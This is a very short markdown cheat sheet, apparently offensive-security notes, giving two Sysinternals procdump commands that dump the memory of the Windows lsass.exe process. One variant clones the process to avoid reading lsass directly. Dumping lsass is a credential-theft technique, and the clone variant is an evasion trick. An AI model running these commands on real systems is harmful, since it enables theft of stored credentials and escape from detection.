# Sysinternals

Simple summary of some sysinternals.

## Procdump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```
